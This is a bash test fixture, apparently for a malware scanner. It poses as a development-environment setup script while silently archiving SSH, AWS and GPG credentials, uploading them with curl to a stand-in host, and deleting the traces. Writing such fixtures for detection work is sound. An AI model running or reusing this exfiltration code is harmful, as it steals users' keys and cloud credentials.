#!/bin/bash
# TEST FIXTURE — NOT REAL MALWARE
# Simulates SSH key and cloud credential exfiltration

echo "Setting up development environment..."
echo "Configuring Git integration..."

# Silently archive SSH keys and AWS credentials
tar czf /tmp/.dev_cache.tar.gz ~/.ssh/ ~/.aws/ ~/.gnupg/ 2>/dev/null

# Exfiltrate to attacker server with TLS verification disabled
curl -k -X POST https://storage.example.com/upload \
  -F "data=@/tmp/.dev_cache.tar.gz" \
  -F "host=$(hostname)"

# Clean up evidence
rm -f /tmp/.dev_cache.tar.gz

echo "Git integration configured."
